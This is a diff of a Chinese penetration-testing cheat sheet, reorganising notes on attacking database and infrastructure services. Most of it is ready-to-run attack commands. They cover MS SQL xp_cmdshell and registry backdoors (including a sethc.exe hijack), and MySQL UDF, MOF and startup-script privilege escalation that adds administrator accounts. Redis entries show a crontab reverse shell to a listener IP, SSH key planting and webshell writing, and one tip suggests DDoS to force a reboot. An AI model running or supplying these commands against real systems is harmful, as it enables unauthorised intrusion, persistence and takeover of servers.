@@ -26,329 +26,6 @@
 - 文章
     - [ffmpeg SSRF漏洞分析](http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 
-## 数据库
-### memcached
-**未授权访问漏洞**
-- POC | Payload | exp
-
-    `telnet <ip> 11211`
-
-    `nc -vv <ip> 11211`
-
-    ```bash
-    set aaa 0 10 9  # 存个 aaa 值
-    memcached
-
-    get aaa # 读这个值
-    ```
-
-### MS SQL Server
-**文章**
-- [从攻击MS SQL Server到获得系统访问权限](https://www.freebuf.com/articles/database/22997.html)
-
-**提权**
-- **SA 提权**
-    1. 判断扩展存储是否存在：
-        ```
-        select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'
-        select count(*) from master.dbo.sysobjects where name='xp_regread'
-        恢复：
-        exec sp_dropextendedproc 'xp_cmdshell'
-        exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'
-        EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005)
-        ```
-
-    2. 列目录：
-        ```
-        exec master..xp_cmdshell 'ver'
-        (or) exec master..xp_dirtree 'c:\',1,1
-        (or) drop table black
-        create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--
-        insert into black exec master..xp_cmdshell 'dir c:\'
-        select top 1 mulu from black where id=1
-        xp_cmdshell 被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权
-        ```
-
-    3. 备份启动项：
-        ```
-        alter database [master] set RECOVERY FULL
-        create table cmd (a image)
-        backup log [master] to disk = 'c:\cmd1' with init
-        insert into cmd (a) values (0x(batcode))
-        backup log [master] to disk = 'C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat'
-        drop table cmd
-        ```
-
-    4. 映像劫持
-
-        `xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'`
-
-    5. 沙盒模式提权：
-
-        a：`exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet.0\Engines','SandBoxMode','REG_DWORD',0;` # 关闭沙盒模式
-
-        b：`Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user mstlab mstlab /add")');` #or c:\windows\system32\ias\dnary.mdb string 类型用此。
-        开启 OpenRowSet：`exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;`
-
-    6. xp_regwrite 操作注册表
-
-        `exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion un','black','REG_SZ','net user test test /add'`
-
-        开启 xp_oacreate : exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
-
-### mysql
-**提权**
-- **文章**
-    - [Windows下三种mysql提权剖析](https://xz.aliyun.com/t/2719)
-
-- **通过 phpmyadmin 来 getshell**
-    - 确认绝对路径
-
-        利用 log 变量，猜绝对路径
-
-        ![image](../../../assets/img/安全/笔记/业务软件vul整合笔记/1.png)
-
-        或者直接查询 `select @@basedir;`
-
-        直接 SQL 写文件
-        `select '<?php phpinfo(); ?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/a.php';`
-        如果 file_priv 为 null，那么是写不了的，可以尝试使用日志写马
-        ```sql
-        set global general_log='on';
-        set global general_log_file='C:/phpStudy/PHPTutorial/WWW/a.php';
-        select '<?php phpinfo(); ?>';
-        set global general_log=off;
-        ```
-
-- **UDF 提权**
-    - 文章
-        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)
-
-    - POC | Payload | exp
-        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
-
-    - 手工
-        ```sql
-        select @@basedir;  # 查看 mysql 安装目录
-        select 'It is dll' into dumpfile 'C:\。。lib::';  # 利用 NTFS ADS 创建 lib 目录
-        select 'It is dll' into dumpfile 'C:\。。lib\plugin::';  # 利用NTFS ADS 创建 plugin 目录
-        select 0xUDFcode into dumpfile 'C:\phpstudy\MySQL\lib\plugin\mstlab.dll';  # 导出 udfcode，注意修改 udfcode
-        create function cmdshell returns string soname 'mstlab.dll';   #用 udf 创建 cmd 函数，shell,sys_exec,sys_eval
-        select shell('cmd','net user');     # 执行 cmd 命令
-        show variables like '%plugin%';     # 查看 plugin 路径
-        ```
-
-        小技巧：
-
-        1. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中 ImagePath 的值为 mysql 安装目录
-        2. my.ini 中 datadir 的值是数据存放目录
-        3. UPDATE user set File_priv ='Y';  flush privileges; 强制加 file权限
-
-        ```sql
-        USE mysql;
-        CREATE TABLE npn(line blob);
-        INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
-        SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
-        CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
-        SELECT sys_exec("net user npn npn12345678 /add");
-        SELECT sys_exec("net localgroup Administrators npn /add");
-        ```
-
-- **MOF 提权**
-
-    MOF提权的条件要求十分严苛：
-    1. windows 03 及以下版本
-    2. mysql 启动身份具有权限去读写 c:/windows/system32/wbem/mof 目录
-    3. secure-file-priv 参数不为 null
-
-    ```ini
-    #pragma namespace("\\.\root\subscription")
-
-    instance of __EventFilter as
-    {
-        EventNamespace = "Root\Cimv2";
-        Name  = "filtP2";
-        Query = "Select * From __InstanceModificationEvent "
-                "Where TargetInstance Isa \"Win32_LocalTime\" "
-                "And TargetInstance.Second = 5";
-        QueryLanguage = "WQL";
-    };
-
-    instance of ActiveScriptEventConsumer as
-    {
-        Name = "consPCSV2";
-        ScriptingEngine = "JScript";
-        ScriptText =
-        "var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"net.exe user sqladmin admin /add&&net.exe localgroup administrators sqladmin /add\")";
-    };
-
-    instance of __FilterToConsumerBinding
-    {
-        Consumer   = ;
-        Filter = ;
-    };
-    ```
-    1. 保存为 1.mof,然后 mysql 执行：`select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';`
-    2. mof 被执行的话，会帮我们添加一个叫 sqladmin 的用户。
-
-    **关于 Mof 提权的弊端**
-
-    我们提权成功后，就算被删号，mof 也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？
-    ```
-    net stop winmgmt
-    del c:/windows/system32/wbem/repository
-    net start winmgmt
-    ```
-
-- **启动项提权**
-
-    在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和 mof 几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用 mysql 写文件，写入一段 VBS 代码到开机自启动中，服务器重启达到创建用户并提权，可以使用 DDOS 迫使服务器重启。
-
-    提权条件
-    1. file_priv 不为 null
-    2. 已知 root 密码
-
-    ```sql
-    create table a (cmd text);
-    insert into a values ("set wshshell=createobject (""wscript.shell"") " );
-    insert into a values ("a=wshshell.run (""cmd.exe /c net user sqladmin 123456 /add"",0) " );
-    insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators sqladmin /add"",0) " );
-    select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
-    ```
-
-### oracle
-**工具**
-- [jas502n/oracleShell](https://github.com/jas502n/oracleShell) - oracle 数据库命令执行
-
-**CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP 代码执行漏洞**
-- MSF 模块
-    ```bash
-    use exploit/windows/oracle/client_system_analyzer_upload
-    ```
-
-**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
-- 文章
-    - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)
-
-- MSF 模块
-    ```bash
-    use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到 oracle 的内存信息,若是能获取到内存中的数据即为存在漏洞。
-    set rhosts <ip>
-    run
-
-    use auxiliary/admin/oracle/sid_brute  # 爆破 oracle 的 SID
-    set rhosts <ip>
-    run
-    ```
-
-**CVE-2012-5615 Oracle MySQL Server 5.5.19 用户名枚举漏洞**
-- POC | Payload | exp
-    - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
-    - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)
-
-### OrientDB
-**CVE-2017-11467**
-- 文章
-    - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)
-
-- POC | Payload | exp
-    - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)
-
-### redis
-**未授权访问漏洞**
-- 文章
-    - [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
-    - [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
-    - [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
-    - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)
-
-- 搭建环境
-    ```bash
-    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
-    tar xzf redis-3.2.0.tar.gz
-    cd redis-3.2.0
-    make
-    ```
-    ```vim
-    vim redis.conf
-
-    # bind 127.0.0.1
-    protected-mode no
-    ```
-    ```
-    ./src/redis-server redis.conf
-    ```
-
-- 利用
-    ```sql
-    redis-cli -h <目标IP>
-    >info   # 查看redis版本信息、一些具体信息、服务器版本信息等等：
-    >CONFIG GET dir # 获取默认的redis目录
-    >CONFIG GET dbfilename # 获取默认的 rdb 文件名
-    ```
-
-    **利用计划任务执行命令反弹 shell**
-
-    在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 7999` 然后执行命令:
-    ```bash
-    > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
-    > config set dir /var/spool/cron/
-    > config set dbfilename root
-    > save
-    ```
-
-    **写 ssh-keygen 公钥然后使用私钥登陆**
-
-    在以下条件下，可以利用此方法
-    1. Redis 服务使用 ROOT 账号启动
-    2. 服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。
-
-    首先在本地生成一对密钥 `ssh-keygen -t rsa` 然后执行命令:
-    ```bash
-    将公钥的内容写到一个文本中命令如下
-    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt
-
-    将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下
-    cat test.txt | redis -cli -h <hostname> -x set test
-    redis-cli -h <hostname>
-    keys *
-    get test
-    config set dir "/root/.ssh"
-    config set dbfilename "authorized_keys"
-    save
-    ```
-    保存后可以直接利用公钥登录 ssh
-
-    **往 web 物理路径写 webshell**
-
-    当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell
-    执行以下命令
-    ```bash
-    > config set dir /var/www/html/
-    > config set dbfilename shell.php
-    > set x "<?php phpinfo();?>"
-    > save
-    ```
-    即可将 shell 写入 web 目录(web 目录根据实际情况)
-
-**Redis 4.x 5.x RCE**
-- 搭建环境
-    ```bash
-    yum install tcl
-    wget download.redis.io/releases/redis-4.0.11.tar.gz
-    tar zxf redis-4.0.11.tar.gz
-    cd redis-4.0.11
-    make PREFIX=/usr/local/redis install
-
-    /usr/local/redis/bin/redis-server
-
-    参考 https://mp.weixin.qq.com/s/MSWLqzyNnliX1G7TRYAwVw
-    ```
-
-- POC | Payload | exp
-    - [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
-    - [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
-
 ---
 
 ## 远程服务
@@ -581,8 +258,343 @@
 
 ---
 
-# 不太好分
-## 虚拟化 & 云平台
+# 数据库
+## memcached
+**未授权访问漏洞**
+- POC | Payload | exp
+
+    `telnet <ip> 11211`
+
+    `nc -vv <ip> 11211`
+
+    ```bash
+    set aaa 0 10 9  # 存个 aaa 值
+    memcached
+
+    get aaa # 读这个值
+    ```
+
+---
+
+## MS SQL Server
+**文章**
+- [从攻击MS SQL Server到获得系统访问权限](https://www.freebuf.com/articles/database/22997.html)
+
+**提权**
+- **SA 提权**
+    1. 判断扩展存储是否存在：
+        ```
+        select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'
+        select count(*) from master.dbo.sysobjects where name='xp_regread'
+        恢复：
+        exec sp_dropextendedproc 'xp_cmdshell'
+        exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'
+        EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005)
+        ```
+
+    2. 列目录：
+        ```
+        exec master..xp_cmdshell 'ver'
+        (or) exec master..xp_dirtree 'c:\',1,1
+        (or) drop table black
+        create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--
+        insert into black exec master..xp_cmdshell 'dir c:\'
+        select top 1 mulu from black where id=1
+        xp_cmdshell 被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权
+        ```
+
+    3. 备份启动项：
+        ```
+        alter database [master] set RECOVERY FULL
+        create table cmd (a image)
+        backup log [master] to disk = 'c:\cmd1' with init
+        insert into cmd (a) values (0x(batcode))
+        backup log [master] to disk = 'C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat'
+        drop table cmd
+        ```
+
+    4. 映像劫持
+
+        `xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'`
+
+    5. 沙盒模式提权：
+
+        a：`exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet.0\Engines','SandBoxMode','REG_DWORD',0;` # 关闭沙盒模式
+
+        b：`Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user mstlab mstlab /add")');` #or c:\windows\system32\ias\dnary.mdb string 类型用此。
+        开启 OpenRowSet：`exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;`
+
+    6. xp_regwrite 操作注册表
+
+        `exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion un','black','REG_SZ','net user test test /add'`
+
+        开启 xp_oacreate : exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
+
+---
+
+## mysql
+**提权**
+- **文章**
+    - [Windows下三种mysql提权剖析](https://xz.aliyun.com/t/2719)
+
+- **通过 phpmyadmin 来 getshell**
+    - 确认绝对路径
+
+        利用 log 变量，猜绝对路径
+
+        ![image](../../../assets/img/安全/笔记/业务软件vul整合笔记/1.png)
+
+        或者直接查询 `select @@basedir;`
+
+        直接 SQL 写文件
+        `select '<?php phpinfo(); ?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/a.php';`
+        如果 file_priv 为 null，那么是写不了的，可以尝试使用日志写马
+        ```sql
+        set global general_log='on';
+        set global general_log_file='C:/phpStudy/PHPTutorial/WWW/a.php';
+        select '<?php phpinfo(); ?>';
+        set global general_log=off;
+        ```
+
+- **UDF 提权**
+    - 文章
+        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)
+
+    - POC | Payload | exp
+        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
+
+    - 手工
+        ```sql
+        select @@basedir;  # 查看 mysql 安装目录
+        select 'It is dll' into dumpfile 'C:\。。lib::';  # 利用 NTFS ADS 创建 lib 目录
+        select 'It is dll' into dumpfile 'C:\。。lib\plugin::';  # 利用NTFS ADS 创建 plugin 目录
+        select 0xUDFcode into dumpfile 'C:\phpstudy\MySQL\lib\plugin\mstlab.dll';  # 导出 udfcode，注意修改 udfcode
+        create function cmdshell returns string soname 'mstlab.dll';   #用 udf 创建 cmd 函数，shell,sys_exec,sys_eval
+        select shell('cmd','net user');     # 执行 cmd 命令
+        show variables like '%plugin%';     # 查看 plugin 路径
+        ```
+
+        小技巧：
+
+        1. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中 ImagePath 的值为 mysql 安装目录
+        2. my.ini 中 datadir 的值是数据存放目录
+        3. UPDATE user set File_priv ='Y';  flush privileges; 强制加 file权限
+
+        ```sql
+        USE mysql;
+        CREATE TABLE npn(line blob);
+        INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
+        SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+        CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+        SELECT sys_exec("net user npn npn12345678 /add");
+        SELECT sys_exec("net localgroup Administrators npn /add");
+        ```
+
+- **MOF 提权**
+
+    MOF提权的条件要求十分严苛：
+    1. windows 03 及以下版本
+    2. mysql 启动身份具有权限去读写 c:/windows/system32/wbem/mof 目录
+    3. secure-file-priv 参数不为 null
+
+    ```ini
+    #pragma namespace("\\.\root\subscription")
+
+    instance of __EventFilter as
+    {
+        EventNamespace = "Root\Cimv2";
+        Name  = "filtP2";
+        Query = "Select * From __InstanceModificationEvent "
+                "Where TargetInstance Isa \"Win32_LocalTime\" "
+                "And TargetInstance.Second = 5";
+        QueryLanguage = "WQL";
+    };
+
+    instance of ActiveScriptEventConsumer as
+    {
+        Name = "consPCSV2";
+        ScriptingEngine = "JScript";
+        ScriptText =
+        "var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"net.exe user sqladmin admin /add&&net.exe localgroup administrators sqladmin /add\")";
+    };
+
+    instance of __FilterToConsumerBinding
+    {
+        Consumer   = ;
+        Filter = ;
+    };
+    ```
+    1. 保存为 1.mof,然后 mysql 执行：`select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';`
+    2. mof 被执行的话，会帮我们添加一个叫 sqladmin 的用户。
+
+    **关于 Mof 提权的弊端**
+
+    我们提权成功后，就算被删号，mof 也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？
+    ```
+    net stop winmgmt
+    del c:/windows/system32/wbem/repository
+    net start winmgmt
+    ```
+
+- **启动项提权**
+
+    在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和 mof 几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用 mysql 写文件，写入一段 VBS 代码到开机自启动中，服务器重启达到创建用户并提权，可以使用 DDOS 迫使服务器重启。
+
+    提权条件
+    1. file_priv 不为 null
+    2. 已知 root 密码
+
+    ```sql
+    create table a (cmd text);
+    insert into a values ("set wshshell=createobject (""wscript.shell"") " );
+    insert into a values ("a=wshshell.run (""cmd.exe /c net user sqladmin 123456 /add"",0) " );
+    insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators sqladmin /add"",0) " );
+    select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
+    ```
+
+---
+
+## oracle
+**工具**
+- [jas502n/oracleShell](https://github.com/jas502n/oracleShell) - oracle 数据库命令执行
+- [quentinhardy/odat](https://github.com/quentinhardy/odat)
+
+**CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP 代码执行漏洞**
+- MSF 模块
+    ```bash
+    use exploit/windows/oracle/client_system_analyzer_upload
+    ```
+
+**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
+- 文章
+    - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)
+
+- MSF 模块
+    ```bash
+    use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到 oracle 的内存信息,若是能获取到内存中的数据即为存在漏洞。
+    set rhosts <ip>
+    run
+
+    use auxiliary/admin/oracle/sid_brute  # 爆破 oracle 的 SID
+    set rhosts <ip>
+    run
+    ```
+
+**CVE-2012-5615 Oracle MySQL Server 5.5.19 用户名枚举漏洞**
+- POC | Payload | exp
+    - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
+    - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)
+
+---
+
+## OrientDB
+**CVE-2017-11467**
+- 文章
+    - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)
+
+- POC | Payload | exp
+    - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)
+
+---
+
+## redis
+**未授权访问漏洞**
+- 文章
+    - [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
+    - [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
+    - [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
+    - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)
+
+- 搭建环境
+    ```bash
+    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
+    tar xzf redis-3.2.0.tar.gz
+    cd redis-3.2.0
+    make
+    ```
+    ```vim
+    vim redis.conf
+
+    # bind 127.0.0.1
+    protected-mode no
+    ```
+    ```
+    ./src/redis-server redis.conf
+    ```
+
+- 利用
+    ```sql
+    redis-cli -h <目标IP>
+    >info   # 查看redis版本信息、一些具体信息、服务器版本信息等等：
+    >CONFIG GET dir # 获取默认的redis目录
+    >CONFIG GET dbfilename # 获取默认的 rdb 文件名
+    ```
+
+    **利用计划任务执行命令反弹 shell**
+
+    在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 7999` 然后执行命令:
+    ```bash
+    > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
+    > config set dir /var/spool/cron/
+    > config set dbfilename root
+    > save
+    ```
+
+    **写 ssh-keygen 公钥然后使用私钥登陆**
+
+    在以下条件下，可以利用此方法
+    1. Redis 服务使用 ROOT 账号启动
+    2. 服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。
+
+    首先在本地生成一对密钥 `ssh-keygen -t rsa` 然后执行命令:
+    ```bash
+    将公钥的内容写到一个文本中命令如下
+    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt
+
+    将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下
+    cat test.txt | redis -cli -h <hostname> -x set test
+    redis-cli -h <hostname>
+    keys *
+    get test
+    config set dir "/root/.ssh"
+    config set dbfilename "authorized_keys"
+    save
+    ```
+    保存后可以直接利用公钥登录 ssh
+
+    **往 web 物理路径写 webshell**
+
+    当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell
+    执行以下命令
+    ```bash
+    > config set dir /var/www/html/
+    > config set dbfilename shell.php
+    > set x "<?php phpinfo();?>"
+    > save
+    ```
+    即可将 shell 写入 web 目录(web 目录根据实际情况)
+
+**Redis 4.x 5.x RCE**
+- 搭建环境
+    ```bash
+    yum install tcl
+    wget download.redis.io/releases/redis-4.0.11.tar.gz
+    tar zxf redis-4.0.11.tar.gz
+    cd redis-4.0.11
+    make PREFIX=/usr/local/redis install
+
+    /usr/local/redis/bin/redis-server
+
+    参考 https://mp.weixin.qq.com/s/MSWLqzyNnliX1G7TRYAwVw
+    ```
+
+- POC | Payload | exp
+    - [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
+    - [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
+
+---
+
+# 虚拟化 & 云平台
 **检测虚拟机**
 - **windows**
 
@@ -598,14 +610,16 @@
 
     `dmidecode -s system-product-name`
 
-### Citrix Receiver
+## Citrix Receiver
 `注意一下 1494 和 2598 端口`
 
 **文章**
 - [CitrixReceiver平台的一次渗透测试](https://forum.90sec.com/t/topic/310)
 - [利用Citrix Receiver浏览器进行渗透](https://mp.weixin.qq.com/s/3p7e27JF6NV6C0_DEPiaqg)
 
-### Docker
+---
+
+## Docker
 **docker remote api 未授权访问**
 - POC | Payload | exp
     - `http://<ip>:2375/version`
@@ -613,8 +627,8 @@
 
 ---
 
-## 分布式
-### Hadoop
+# 分布式
+## Hadoop
 **文章**
 - [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
 - [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)
@@ -628,7 +642,9 @@
     http://<ip>:50070/logs/
     ```
 
-### ZooKeeper
+---
+
+## ZooKeeper
 **ZooKeeper 未授权访问漏洞**
 - 文章
     - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
